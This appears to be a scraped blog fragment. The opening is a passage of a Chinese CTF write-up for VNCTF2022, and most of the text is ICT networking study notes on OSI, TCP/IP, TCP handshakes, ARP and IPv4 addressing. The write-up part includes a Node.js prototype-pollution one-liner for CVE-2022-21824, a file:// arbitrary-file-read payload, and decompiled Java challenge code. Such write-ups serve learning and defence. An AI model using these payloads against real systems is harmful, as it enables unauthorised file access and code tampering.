属性（低）（CVE-2022-21824） 由于 console.table() 函数的格式化逻辑，允许用户控制的输入传递给 properties 参数同时传递一个是不安全的具有至少一个属性作为第一个参数的普通对象，可以是__proto__. 原型污染的控制非常有限，因为它只允许为对象原型的数字键分配一个空字符串。 exp： console.table([&#123; x : 1 &#125;], [ &quot;__proto__&quot; ]); easyJava存在任意文件读取 读不到flag，应该是要通过调用readflag来读取flag file?url&#x3D;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F; 反编译看一下源码 Secr3t.jad &#x2F;&#x2F; Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov. &#x2F;&#x2F; Jad home page: http:&#x2F;&#x2F;www.kpdus.com&#x2F;jad.html &#x2F;&#x2F; Decompiler options: packimports(3) &#x2F;&#x2F; Source File Name: Secr3t.java package util; import java.io.*; import org.apache.commons.lang3.RandomStringUtils; public class Secr3t &#123; private Secr3t() &#123; &#125; public static String getKey() &#123; return Key; &#125; public static StringBuffer getFlag() &#123; InputStream in; BufferedReader read; Flag &#x3D; new StringBuffer(); in &#x3D; null; try &#123; in &#x3D; Runtime.getRuntime().exec(&quot;&#x2F;readflag&quot;).getInputStream(); &#125; catch(IOException e) &#123; e.printStackTrace(); &#125; read &#x3D; new BufferedReader(new InputStreamReader(in)); for(String line &#x3D; null; (line &#x3D; read.readLine()) !&#x3D; null;) Flag.append((new StringBuilder()).append(line).append(&quot;\\n&quot;).toString()); IOException e; try &#123; in.close(); read.close(); &#125; &#x2F;&#x2F; Misplaced declaration of an exception variable catch(IOException e) &#123; e.printStackTrace(); System.out.println(&quot;Secr3t : io exception!&quot;); &#125; break MISSING_BLOCK_LABEL_176; e; e.printStackTrace(); try &#123; in.close(); read.close(); &#125; &#x2F;&#x2F; Misplaced declaration of an exception variable catch(IOException e) &#123; e.printStackTrace(); System.out.println(&quot;Secr3t : io exception!&quot;); &#125; break MISSING_BLOCK_LABEL_176; Exception exception; exception; try &#123; in.close(); read.close(); &#125; catch(IOException e) &#123; e.printStackTrace(); System.out.println(&quot;Secr3t : io exception!&quot;); &#125; throw exception; return Flag; &#125; public static boolean check(String checkStr) &#123; return &quot;vnctf2022&quot;.equals(checkStr); &#125; private static final String Key &#x3D; RandomStringUtils.randomAlphanumeric(32); private static StringBuffer Flag; &#125; HelloWorldServlet.jad package servlet; import javax.servlet.annotation.*; import entity.*; import javax.servlet.http.*; import java.io.*; import java.util.*; import util.*; import javax.servlet.*; @WebServlet(name &#x3D; &quot;HelloServlet&quot;, urlPatterns &#x3D; &#123; &quot;&#x2F;evi1&quot; &#125;)&#x2F;&#x2F;比赛的时候用的jad反编译的没这块，虽然之后查日志找到了路径 public class HelloWorldServlet extends HttpServlet &#123; private volatile String name; private volatile String age; private volatile String height; User user; public HelloWorldServlet() &#123; this.name &#x3D; &quot;m4n_q1u_666&quot;; this.age &#x3D; &quot;666&quot;; this.height &#x3D; &quot;180&quot;; &#125; public void init() throws ServletException &#123; this.user &#x3D; new User(this.name, this.age, this.height); &#125; protected void doGet(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException &#123; final String reqName &#x3D; req.getParameter(&quot;name&quot;); if (reqName !&#x3D; null) &#123; this.name &#x3D; reqName; &#125; if (Secr3t.check(this.name)) &#123; this.Response(resp, &quot;no vnctf2022!&quot;); return; &#125; if (Secr3t.check(this.name)) &#123; this.Response(resp, &quot;The Key is &quot; + Secr3t.getKey()); &#125; &#125; protected void doPost(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException &#123; final String key &#x3D; req.getParameter(&quot;key&quot;); final String text &#x3D; req.getParameter(&quot;base64&quot;); if (Secr3t.getKey().equals(key) &amp;&amp; text !&#x3D; null) &#123; final Base64.Decoder decoder &#x3D; Base64.getDecoder(); final byte[] textByte &#x3D; decoder.decode(text); final User u &#x3D; (User)SerAndDe.deserialize(textByte); if (this.user.equals((Object)u)) &#123; this.Response(resp, &quot;Deserialize\\u2026\\u2026 Flag is &quot; + Secr3t.getFlag().toString()); &#125; &#125; else &#123; this.Response(resp, &quot;KeyError&quot;); &#125; &#125; private void Response(final HttpServletResponse resp, final String outStr) throws IOException &#123; final ServletOutputStream out &#x3D; resp.getOutputStream(); out.write(outStr.getBytes()); out.flush(); out.close(); &#125; &#125; 留个坑，不会了，暑假开始学java再来补（","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"ict学习笔记","slug":"ict学习笔记","date":"2022-01-24T04:01:19.000Z","updated":"2022-03-28T08:22:24.242Z","comments":true,"path":"2022/01/24/ict学习笔记/","link":"","permalink":"https://ethe448.github.io/2022/01/24/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"数据通信网络基础概念通信：人与人，人与物，物与物之间通过某种媒介和行为进行的信息传递与交流 网络通信：终端设备之间通过计算机网络进行的通信 信息传递过程 数据被打包成原始的数据载荷，并添加一定信息(目的地址)的头部和尾部形成报文(封装)，报文通过网线到达网关，网关对报文进行&quot;解封装&quot;，读取目的地址，再重新封装，根据不同的目的地址送往不同的路由器，报文由此离开本地网络，进入internet的干道进行传输，后进入目的地址所在的本地链路，由本地链路的网关或路由器再进行解封装和封装，并根据目的地址觉得发往相应的下一台路由器，最终到达目的计算机所在的网络的网关，再进行解封装和封装，根据目的地址发往相应的计算机。计算机收到报文后对其进行校验处理，校验无误后，接收报文，并将其中的数据载荷交由相应的应用程序进行处理。 常见术语 • 数据载荷：可以理解为最终想要传递的信息，但实际上，在具有层次化结构的通信过程中， 上一层协议传递给下一层协议的数据单元（报文）都可以称之为下一层协议的数据载荷。 • 报文：网络中交换与传输的数据单元，具有一定的内在格式，通常都具有头部+数据载荷+ 尾部的基本结构。传输过程中，报文的格式和内容可能发生改变。 • 头部：为了更好的传递信息，在组装报文时，在数据载荷的前面添加的信息段统称为报文 的头部。 • 尾部：为了更好的传递信息，在组装报文时，在数据载荷的后面添加的信息段统称为报文 的尾部。注意，很多报文是没有尾部的。 • 封装：分层协议所采用的一种技术，底层协议收到来自上层协议的消息时，将该消息附加 到底层帧的数据部分。 • 解封装：是封装的逆过程，也就是去掉报文的头部和尾部，获取数据载荷的过程。 • 网关：是在采用不同体系结构或协议的网络之间进行互通时，用于提供协议转换、路由选 择、数据交换等功能的网络设备。网关是一种根据其部署位置和功能而命名的术语，而不 是一种特定的设备类型。 • 路由器：为报文选择传递路径的网络设备。 • 终端设备：数据通信系统的端设备，作为数据的发送者或接收者，提供用户接入协议操作 所需必要功能，可以是计算机、服务器、VoIP、手机等。 基本概念数据通信网络：由路由器，交换机，防火墙，无线控制器，无线接入点，以及个人电脑，网络打印机，服务器等设备构成的通信网络。 功能：实现数据互通 网络设备交换机：距离终端用户最近的设备，用于终端用户接入网络、对数据帧进行交换 终端设备（pc，服务器等）的网络接入 二层交换 在园区网络中，交换机一般来说是距离终端用户最近的设备，接入层的交换机一般为 二层交换机，又称为以太网交换机，二层是指TCP/IP参考模型的数据链路层； 以太网交换机可以实现：数据帧的交换、终端用户设备的接入、基本的接入安全功能、 二层链路的冗余等； 广播域：一个节点发送一个广播报文其余节点都能够收到的节点的集合 路由器：网络层设备，可以在因特网中进行数据的转发 实现同类型网络或异种网络之间的通信 隔离广播域 维护路由表、运行路由协议 路径（路由信息）选择、IP报文的转发 广域网接入、网络地址转换 连接通过交换机组建的二层网络 路由器工作在TCP/IP参考模型的网络层； 路由器可以实现：维护路由表和路由信息、路由发现及路径 选择、数据转发、隔离广 播域、广域网接入和网络地址转换及特定的安全功能 防火墙：网络安全设备，用于控制两个网络之间的安全通信。通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现对网络的安全保护 隔离不同安全级别的网络 实现不同安全级别的网络之间的访问控制（安全策略） 用户身份认真 实现远程接入功能 实现数据加密及虚拟专用网业务 执行网络地址转换 其他安全功能 是位于两个信任程度不同的网络之间（如企业内部网络和Internet之间）的设备，它 对两个网络之间的通信进行控制，通过强制实施统一的安全策略，防止对重要信息资 源的非法存取和访问，以达到保护系统安全的目的。 无线网络： ​ 无线局域网WLAN广义上是指以无线电波、激光、红外线等无线信号来代替有线局域网中 的部分或全部传输介质所构成的网络。而常见的Wi-Fi是指IEEE 802.11标准上的无线局域网 技术。 ​ 在WLAN中，常见的设备有胖AP、瘦AP和无线控制器AC。 无线接入点 (AP, Access Point） ​ 一般支持FAT AP、FIT AP和云管理工作模式，根据网络规划的需求，可以灵活地在各种模式下切换。 ​ FAT AP：适用于家庭，独立工作，需单独配置，功能较为单一，成本低。 ​ FIT AP：适用于大中型企业，需要配合AC使用，由AC统一管理和配置，功能丰富。 ​ 云管理：适用于中小型企业，需要配合云管理平台使用，由云管理平台统一管理和配置，功能丰富，即插即用。 无线接入控制器 (AC, Access Controller) ​ 一般位于整个网络的汇聚层，提供高速、安全、可靠的WLAN业务。 ​ 提供大容量、高性能、高可靠性、易安装、易维护的无线数据控制业务，具有 组网灵活、绿色节能等优势 局域网、城域网、广域网局域网：覆盖范围在几公里之内。主要作用是把分布较近的若干终端电脑连接起来，使用以太网、wi-fi等技术 城域网：较大型的局域网，成本高，传输速率快。改进了局域网的传输介质，扩大了访问范围。主要作用是将同一城市内不同地点的主机、数据库以及局域网等连接起来；与广域网作用相似，但实现方式和性能不同。基于大型的局域网，与局域网技术相似，如：以太网 (10Gbps/100Gbps)、 WiMAX (全球互通微波访问) 广域网：覆盖范围一般在几公里以上，可大至几十、几百或几千公里。主要作用是把分布较远 (如: 跨越城市、跨越国家， 等等) 的若干局域网或城域 网连接起来；会用到电信运营商的通信线路。使用HDLC、PPP等技术 网络拓扑是指用传输介质（如双绞线、光纤等）互联各种设备所呈现的结构化布局。 形态 星型网络： 所有节点通过一个中心节点连接在一起。 优点：容易在网络中增加新的节点。通信数据必须经过中心节点中转，易于实现网络 监控。 缺点：中心节点的故障会影响到整个网络的通信。 总线型网络： 所有节点通过一条总线（如同轴电缆）连接在一起。 优点：安装简便，节省线缆。某一节点的故障一般不会影响到整个网络的通信。 缺点：总线故障会影响到整个网络的通信。某一节点发出的信息可以被所有其他节点 收到，安全性低。 环形网络： 所有节点连成一个封闭的环形。 优点：节省线缆。 缺点：增加新的节点比较麻烦，必须先中断原来的环，才能插入新节点以形成新环。 树形网络： 树型结构实际上是一种层次化的星型结构。 优点：能够快速将多个星型网络连接在一起，易于扩充网络规模。 缺点：层级越高的节点故障导致的网络问题越严重 全网状网络： 所有节点都通过线缆两两互联。 优点：具有高可靠性和高通信效率。 缺点：每个节点都需要大量的物理端口，同时还需要大量的互连线缆。成本高，不易 扩展。 部分网状网络： 只是重点节点之间才两两互连。 优点：成本低于全网状网络。 缺点：可靠性比全网状网络有所降低。 在实际组网中，通常都会根据成本、通信效率、可靠性等具体需求而采用多种拓扑形态相 结合的方法。 网络工程网络工程，就是围绕着网络进行的一系列的活动，包括：网络规划、设计、实施、调试、 排错等。 网络工程设计的知识领域很宽广，其中路由和交换是计算机网络的基本 网络工程师： 网络参考模型应用和数据应用：应用的存在是为了满足人们的各种需求，伴随着应用会有信息的产生。比如文本，图片，视频等都是信息的不同呈现方式 数据：数据是各种信息的载体，大部分应用程序所产生的数据需要在不同的设备之间传递。 • 计算机只能识别0和1的组成的电子数据(digital data)。它不具备读取各种信息的能力，所 以信息需要通过一定的规则翻译成数据。 • 而对人来说，我们不具备读取电子数据的能力，所以在读取信息的时候，需要将数据转成 人能理解的信息。 • 对于一名网络工程师来说，需要更关注数据的端到端传递的过程。 OSI参考模型 OSI 模型(Open Systems Interconnection Model)，由国际化标准组织ISO (The International Organization for Standardization ) 收录在ISO 7489标准中并于1984年发布。 OSI参考模型又被称为七层模型，由下至上依次为： 物理层：在设备之间传输比特流，规定了电平、速度和电缆针脚等物理特性。 物理层：在设备之间传输比特流，规定了电平、速度和电缆针脚等物理特性。 网络层：定义逻辑地址，供路由器确定路径，负责将数据从源网络传输到目的网络。 传输层：提供面向连接或非面向连接的数据传递以及进行重传前的差错检测。 会话层：负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备 中的应用程序之间的服务请求和响应组成。 表示层：提供各种用于应用层数据的编码和转换功能，确保一个系统的应用层发送的 数据能被另一个系统的应用层识别。 应用层：OSI参考模型中最靠近用户的一层，为应用程序提供网络服务。 TCP/IP参考模型 结构上与OSI模型类似，采用分层架构，同时层与层之间联系紧密。 TCP/IP标准参考模型将OSI中的数据链路层和物理层合并为网络接入层，这种划分方式其实 是有悖于现实协议制定情况的，故融合了TCP/IP标准模型和OSI模型的TCP/IP对等模型被提出 TCP/IP常见协议 应用层 HTTP（Hypertext Transfer Protocol，超文本传输协议）：用来访问在网页服务器上 的各种页面。 FTP（File Transfer Protocol，文件传输协议）：为文件传输提供了途径，它允许数据从一台主机传送到另一台主机上，用于文件的下载和上传，采用C/S（Client/Server）结构。 DNS（Domain Name Service，域名称解析服务）：用于实现从主机域名到IP地址之 间的转换。 Telnet：是数据网络中提供远程登录服务的标准协议。Telnet为用户提供了在本地计算机上完成远程设备工作的能力。 传输层 TCP （Transmission Control Protocol，传输控制协议） ：为应用程序提供可靠的面向连接的通信服务。目前，许多流行的应用程序都使用TCP。 UDP（User Datagram Protocol，用户数据报协议）：提供了无连接通信，且不对传 送数据包进行可靠性的保证。 网络层 IP（Internet Protocol，互联网协议）：将传输层的数据封装成数据包并完成源站点 到目的站点的转发，提供无连接的、不可靠的服务。 IGMP（Internet Group Management Protocol，因特网组管理协议）：负责IP组播 成员管理的协议。它用来在IP主机和与其直接相邻的组播路由器之间建立、维护组播 组成员关系。 ICMP（Internet Control Message Protocol，网际报文控制协议）：基于IP协议在网 络中发送控制消息，提供可能发生在通信环境中的各种问题反馈。通过这些信息，使 管理者可以对所发生的问题作出诊断，然后采取适当的措施解决。 数据链路层 PPP（Point-to-Point Protocol，点对点协议）：一种点对点模式的数据链路层协议， 多用于广域网。 Ethernet( 以太网协议 )：一种多路访问广播型数据链路层协议，是当前应用最为广 泛的局域网技术。 PPPoE（Point-to-Point Protocol over Ethernet，以太网承载PPP协议）：PPPoE提 供通过简单桥接访问设备（接入设备）把一个网络的多个主机连接到远程访问集中器 的功能。常见的应用有家庭宽带拨号上网。 常见协议标准化组织IETF：负责开发和推广互联网协议（特别是TCP/IP协议族的协议）的志愿组织 IEEE：制定了全世界电子，电气和计算机科学领域30%左右的标准，如IEEE802.3（Ethernet）、IEEE802.11（WiFi）等。 ISO：指定计算机网络标准，如OSI模型 应用层应用层为应用软件提供接口，使应用程序能够使用网络服务。应用层协议会指定使用相应的传输层协议，以及传输层所使用的端口等。 应用层的PDU被称为Data（数据）。 TCP/IP每一层都让数据得以通过网络进行传输，这些层之间使用PDU（Packet Data Unit， 协议数据单元）彼此交换信息，确保网络设备之间能够通信。 不同层的PDU中包含有不同的信息，因此PDU在不同层被赋予了不同的名称 FTP: FTP客户端提供本地设备对远程服务器的文件进行操作的命令，用户在PC上通过应用程序作为FTP Client，并与FTP服务器建立连接后，可以对FTP Server上的文件进行操作 FTP服务器是运行FTP服务的设备，提供远程客户端访问和操作的功能，用户可以通过FTP客户端程序登录到服务器上，访问设备上的文件。 Telnet： 用户通过Telnet客户端程序连接到Telnet服务器。用户在Telnet客户端中输入命令，这些命令会在服务器端运行，就像直接在服务端的控制台输入一样 传输层传输层协议接收来自应用层的数据baoz，封装上相应的传输层头部，帮助其建立“端到端”的连接。 传输层的PDU被称为Segment（段）。 TCP和UDP报文格式 TCP报文头部： Source Port：源端口，标识哪个应用程序发送。长度为16比特。 Destination Port：目的端口，标识哪个应用程序接收。长度为16比特。 Sequence Number：序号字段。TCP链接中传输的数据流每个字节都编上一个序号。 序号字段的值指的是本报文段所发送数据的第一个字节的序号。长度为32比特。 Acknowledgment Number：确认序列号，是期望收到对方下一个报文段数据的第1 个字节的序号，即上次已成功接收到的数据段的最后一个字节数据的序号加1。只有 Ack标识为1，此字段有效。长度为32比特。 Header Length：头部长度，指出TCP报文头部长度，以32比特（4字节）为计算单位。 若无选项内容，则该字段为5，即头部为20字节。 Reserved：保留，必须填0。长度为6比特。 Control bits：控制位，包含FIN、ACK、SYN等标志位，代表不同状态下的TCP数据 段。 Window：窗口TCP的流量控制，这个值表明当前接收端可接受的最大的数据总数 （以字节为单位）。窗口最大为65535字节。长度为16比特。 Checksum：校验字段，是一个强制性的字段，由发端计算和存储，并由收端进行验 证。在计算检验和时，要包括TCP头部和TCP数据，同时在TCP报文段的前面加上12 字节的伪头部。长度为16比特。 Urgent:紧急指针，只有当URG标志置1时紧急指针才有效。TCP的紧急方式是发送端 向另一端发送紧急数据的一种方式。紧急指针指出在本报文段中紧急数据共有多少个 字节（紧急数据放在本报文段数据的最前面）。长度为16比特。 Options：选项字段（可选），长度为0-40字节。 UDP报文头部 Source Port:源端口，标识哪个应用程序发送。长度为16比特。 Source Port:源端口，标识哪个应用程序发送。长度为16比特。 Length:该字段指定UDP报头和数据总共占用的长度。可能的最小长度是8字节，因为 UDP报头已经占用了8字节。由于这个字段的存在，UDP报文总长不可能超过65535 字节（包括8字节的报头，和65527字节的数据）。 Checksum:覆盖UDP头部和UDP数据的校验和，长度为16比特 端口号 TCP的建立-三次握手 ▫由TCP连接发起方（图中PC1），发送第一个SYN位置1的TCP报文。初始序列号a为一 个随机生成的数字，因为没收到过来自PC2的任何报文，所以确认序列号为0 ； ▫ 接收方（图中PC2）接收到合法的SYN报文之后，回复一个SYN和ACK置1的TCP报文。 初始序列号b为一个随机生成的数字，同时因为此报文是回复给PC1的报文，所以确 认序列号为a+1； ▫ PC1接收到PC2发送的SYN和ACK置位的TCP报文后，回复一个ACK置位的报文，此时 序列号为a+1,确认序列号为b+1。PC2收到之后，TCP双向连接建立 TCP的序列号与确认序列号： TCP使用序列号和确认序列号字段实现数据的可靠和有序传输。 • 假设PC1要给PC2发送一段数据，传输过程如下： ​ ▫ 1. PC1将全部待TCP发送的数据按照字节为单位编上号。假设第一个字节的编号为 “a+1”，第二个字节的序号为“a+2”，依次类推。 ​ ▫ 2. PC1会把每一段数据的第一个字节的编号作为序列号（Sequence number），然后将TCP报文发送出去。 ​ ▫ 3. PC2在收到PC1发送来的TCP报文后，需要给予确认同时请求下一段数据，如何确 定下一段数据呢？序列号( a+1 )+载荷长度=下一段数据的第一个字节的序号 （a+1+12） ​ ▫ 4. PC1在收到PC2发送的TCP报文之后，发现确认序列号为“a+1+12” ，说明“a+1” 到“a+12”这一段的数据已经被接受，需要从“a+1+12”开始发送。 • 为了提升发送效率，也可以一次性发送多段数据，由接收方统一确认。 TCP的窗口滑动机制 • 1. 在TCP三次握手建立连接时，双方都会通过Window字段告诉对方本端最大能够接受的字 节数（也就是缓冲区大小）。 • 2. 连接建立成功之后，发送方会根据接受方宣告的Window大小发送相应字节数的数据。 • 3. 接受方接受到数据之后会放在缓冲区内，等待上层应用来取走缓冲的数据。若数据被上 层取走，则相应的缓冲空间将被释放。 • 4. 接收方根据自身的缓存空间大小通告当前的可以接受的数据大小( Window )。 • 5. 发送方根据接收方当前的Window大小发送相应数量的数据 TCP的关闭-四次挥手 ▫ 1. 由PC1发出一个FIN字段置”1 ”的不带数据的TCP段； ▫ 2. PC2收到PC1发来的FIN置位的TCP报文后，会回复一个ACK置位的TCP报文。 ▫ 3. 若PC2也没有需要发送的数据，则直接发送FIN置位的TCP报文。假设此时PC2还有 数据要发送，那么当PC2发送完这些数据之后会发送一个FIN置位的TCP报文去关闭连 接。 ▫ 4. PC1收到FIN置位的TCP报文，回复ACK报文，TCP双向连接断开 网络层传输层负责建立主机之间进程与进程之间的连接，而网络层则负责数据从一台主机到另一台主机之间的传递。 网络层的PDU被称为包 网络层协议工作过程 当采用IP作为网络层协议时，通信的双方都会被分配到一个“独一无二”的IP地址来标识自 己。IP地址可被写成32位的二进制整数值形式，但为了方便人们阅读和分析，它通常被写 成点分十进制的形式，即四个字节被分开用十进制表示，中间用点分隔，比如192.168.1.1。 IP数据包的封装与转发： 网络层收到上层（如传输层）协议传来的数据时候，会封装一个IP报文头部，并且把 源和目的IP地址都添加到该头部中。 中间经过的网络设备（如路由器），会维护一张指导IP报文转发的“地图”——路由 表，通过读取IP数据包的目的地址，查找本地路由表后转发IP数据包。 IP数据包最终到达目的主机，目的主机通过读取目的IP地址确定是否接受并做下一步 处理。 IP协议工作时，需要如OSPF、IS-IS、BGP等各种路由协议帮助路由器建立路由表，ICMP帮 忙进行网络的控制和状态诊断。 数据链路层数据链路层位于网络层和物理层之间，可以向网络层的IP、IPV6等协议提供服务，数据链路层的PDU被称为Frame（帧）。 以太网与MAC地址以太网：是一种支持多点接入的广播式数据链路层协议。个人电脑的网络接口遵循的就是以太网标准。一般情况下，一个广播域对应一个IP网段。 以太网MAC地址：MAC地址在网络中唯一标识一个网卡，每个网卡都需要且会有唯一的一个MAC地址，MAC地址用于在一个IP网段内，寻址找到具体的物理设备。工作在数据链路层的设备，例如以太网交换机，会维护一张MAC地址表，用于指导数据帧转发。MAC地址由48比特（6个字节）长，12位的16进制数字组成。例如：48-A4-72-1C-8F-4F 地址解析协议（ARP)ARP（Address Resolution Protocol，地址解析协议）是根据IP地址获取数据链路层地址的 一个TCP/IP协议。 ARP是IPv4中必不可少的一种协议，它的主要功能是： 将IP地址解析为MAC地址； 维护IP地址与MAC地址的映射关系的缓存，即ARP表项； 实现网段内重复IP地址的检测。 ARP的工作原理 网络设备一般都有一个ARP缓存（ARP Cache）。ARP缓存用来存放IP地址和MAC地址的关联信息。 在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的ARP表项，则直接 采用该表项中的MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应信息， 则通过发送ARP Request报文来获得它。 学习到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期内 （缺省：180s），设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进 行ARP查询。过了这段有效期，ARP表项会被自动删除。 如果目标设备位于其他网络，则源设备会在ARP缓存表中查找网关的MAC地址。然后将数 据发送给网关。最后网关再把数据转发给目的设备 主机1的ARP缓存表中不存在主机2的MAC地址，所以主机1会发送ARP Request来获取目的 MAC地址。 ARP Request报文封装在以太帧里。帧头中的源MAC地址为发送端主机1的MAC地址。此时， 由于主机1不知道主机2的MAC地址，所以目的MAC地址为广播地址FF-FF-FF-FF-FF-FF。 ARP Request报文中包含发送端MAC地址、发送端IP地址、目的端MAC地址、目的端IP地 址，其中目的端MAC地址的值为0。ARP Request报文会在整个网络上传播，该网络中所有 主机包括网关都会接收到此ARP Request报文。 若不匹配则不会响应，若匹配则则该主机会 将ARP请求报文中的发送端MAC地址和发送端IP地址信息记录到自己的ARP缓存表中，然后 通过ARP Reply报文进行响应 主机2会向主机1回应ARP Reply报文。 ARP Reply报文中的发送端IP地址是主机2自己的IP地址，目的端IP地址是主机1的IP地址， 目的端MAC地址是主机1的MAC地址，发送端MAC地址是自己的MAC地址，同时操作类型 被设置为Reply。 ARP Reply报文通过单播传送 物理层数据到达物理层之后，物理层会根据物理介质的不同，将数字信号转换为光信号、电信号或者是电磁波信号 物理层的PDU被称为比特流 常见传输介质 双绞线：当今以太网最常见的传输介质，按照抗电磁干扰能力还可以分为： STP-屏蔽双绞线和UTP-非屏蔽双绞线 光纤传输，按照功能部件可分为： 光纤传输，按照功能部件可分为： 光模块：将电信号与光信号互转的器件，产生光信号。 串口电缆在WAN（Wide Area Network，广域网）中大规模使用，根据WAN线路类型不同， 串口电缆在设备上连接的接口类型也不同：异/同步串口、ATM接口、POS接口、CE1/PRI 接口等。 无线信号的传输可以通过电磁波进行，例如：无线路由器将数据通过调制以电磁波发送出 去，移动终端的无线网卡将电磁波解调，得到数据，完成从无线路由器到移动终端的数据 传输。 数据通信过程发送方数据封装-&gt;中间网络数据传输-&gt;接收方数据解封装 发送方数据封装 中间网络数据传输封装好的完整数据，会在网络中被传递 一般情况下： 网络中的二层设备（如以太网交换机）只会解封装数据的二层头部，根据二层头部的 信息进行相应的“交换”操作。 网络中的三层设备（如路由器）只会解封装到三层头部，并且根据三层头部的信息进 行相应的“路由”操作。 接收方数据解封装 经过中间网络传递之后，数据最终到达目的服务器。根据不同的协议头部的信息，数据将 被一层层的解封装并做相应的处理和传递，最终交由WEB服务器上的应用程序进行处理。 分层模型的概念的优势 各个层次之间分工、界限明确，有助于各个部件的开发、设计和故障排除。 通过定义在模型的每一层实现什么功能,鼓励产业的标准化。 通过提供接口的方式，使得各种类型的网络硬件和软件能够相互通信，提高兼容性。 网络层协议及IP编址网络层协议网络层协议包括IP协议，ICMP协议，IPX协议等 IP协议ip是Internet Protocol的缩写。Internet Protocol本身是一个协议文件的名称，该协议文件的内容非常少，主要是定义并阐述了IP报文的格式 经常被提及的IP，一般不是特指Internet Protocol这个协议本身，而是泛指直接或间接与IP协议相关的任何内容。 作用：为网络层的设备提供逻辑地址，负责数据包的寻址和转发。 IPv4（Internet Protocol Version 4）协议族是TCP/IP协议族中最为核心的协议族。它工作在TCP/IP协议栈的网络层，该层与OSI参考模型的网络层相对应。 IPv6（Internet Protocol Version 6）是网络层协议的第二代标准协议，也被称为IPng （IP Next Generation）。它是Internet工程任务组IETF（Internet Engineering Task Force）设计的一套规范，是IPv4（Internet Protocol Version 4）的升级版本。 数据封装 应用数据需要经过TCP/IP每一层处理之后才能通过网络传输到目的端，每一层上都使用该 层的协议数据单元PDU（Protocol Data Unit）彼此交换信息。 如上层数据在传输层添加TCP报头后得到的PDU被称为Segment（数据段）；数据段被传递给网络层，网络层添加IP报头得到的PDU被称为Packet（数据包）；数据包被传递到数据链路层，封装数据链路层报头和尾部得到的PDU被称为Frame（数据帧）； 最后，帧被转换为比特，通过网络介质传输。 IPV4报文格式 Version：4 bit，4：表示为IPv4；6：表示为IPv6。 Header Length：4 bit，首部长度，如果不带Option字段，则为20，最长为60。 Type of Service：8 bit，服务类型。只有在有QoS差分服务要求时，这个字段才起作用 Total Length：16 bit，总长度，整个IP数据包的长度。 Identification：16 bit，标识，分片重组时会用到该字段。 Flags：3 bit，标志位。 保留段位：0，保留。 不分段位：1，表示“不能分片”；0，表示“能分片”。 更多段位：1，表示“后面还有分片”；0，表示“最后一个数据片”。 Fragment Offset：12 bit，片偏移，分片重组时会用到该字段。指出较长的分组在分片后， 该片在原分组中的相对位置，与更多段位组合，帮助接收方组合分段的报文。 Time to Live：8 bit，生存时间。可经过的最多路由数，即数据包在网络中可通过的路由器数的最大值。 Protocol：8 bit，协议：下一层协议。指出此数据包携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给哪个进程处理。 1: ICMP, Internet Control Message； 2: IGMP, Internet Group Management； 6: TCP , Transmission Control Protocol； 17: UDP, User Datagram Protocol。 Header Checksum：16 bit，首部检验和。 Source IP Address：32 bit，源IP地址。 Destination IP Address：32 bit，目的IP地址。 Options：可变，选项字段。 Padding：可变，填充字段，全填0 数据包分片将报文分割成多个片段的过程叫分片 网络中转发的ip报文的长度可以不同，但若报文长度超过了数据链路所支持的最大长度，则报文就要分割成若干个较小的片段才能在链路上传输 与IP数据包包头中的Identification，Flags，Fragment Offset三部分内容有关 生存时间（Time to Live,TTL)TTL字段设置了数据包可以经过的路由器数目，一旦经过一个路由器，TTL值减一，当为0时，数据包被丢弃 报文在网段间转发时，如果网络设备上的路由规划不合理，就可能会出现环路，导致报文在网络中无限循环，无法到达目的端。环路发生后，所有发往这个目的地的报文都会被循环转发，随着这种报文逐渐增多，网络将会发生拥塞。 为避免环路导致的网络拥塞，IP报文头中包含一个生存时间TTL（Time To Live）字段。 报文每经过一台三层设备，TTL值减1。初始TTL值由源端设备设置。当报文中的TTL 降为0时，报文会被丢弃。同时，丢弃报文的设备会根据报文头中的源IP地址向源端 发送ICMP错误消息。（注意：网络设备也可被配置为不向源端发送ICMP错误消息。） 协议号目的端的网络层在接收并处理报文以后，需要决定下一步对报文如何处理。IP报文头中的协 议字段标识了将会继续处理报文的协议。 该字段可以标识网络层协议，如ICMP（Internet Control Message Protocol，因特网控制 报文协议，对应值0x01）；也可以标识上层协议，如TCP（Transmission Control Protocol， 传输控制协议，对应值0x06）、UDP（User Datagram Protocol，用户数据包协议，对应 值0x11） IPV4地址介绍IP地址是网络中用于标识一个节点（或者网络设备的接口） ip地址用于ip报文在网络中的寻址 在IP网络上，如果用户要将一台计算机连接到Internet上，就需要申请一个IP地址。IP地址 就像现实中的地址，可以标识网络中的一个节点，数据就是通过它来找到目的地的。即我 们通过IP地址实现全球范围内的网络通信。 IP地址是网络设备接口的属性，不是网络设备本身的属性。当我们说给某台设备分配一个IP 地址时，实质上是指给这台设备的某个接口分配一个IP地址。如果设备有多个接口，通常每 个接口都至少需要一个IP地址。 IPV4地址的表示P地址是长度是32 bit，由4个字节组成。为了阅读和书写方便，IP地址通常采用点分 十进制数来表示。 IPV4地址通常采用点分十进制表示 IPV4地址范围00000000.00000000.00000000.0000000011111111.11111111.11111111.1111111 1，即0.0.0.0255.255.255.255 IPV4地址构成网络部分（网络号）：用于标识一个网络 IP地址不能反映任何有关主机位置的地理信息，只能通过网络号码字段判断出 主机属于哪个网络。 对于网络号相同的设备，无论实际所处的物理位置如何，它们都是处在同一个 网络中。 主机部分（主机号）：用来区分一个网络内的不同主机 网络掩码（子网掩码）：区分一个ip地址中的网络部分和主机部分 网络掩码为32 bit，与IP地址的位数一样，通常也以点分十进制数来表示。 网络掩码不是一个IP地址，在二进制的表示上是一堆连续的1、后面接一堆连续的0。 通常将网络掩码中1的个数称为这个网络掩码的长度。如：掩码0.0.0.0的长度是0，掩 码252.0.0.0的长度是6。 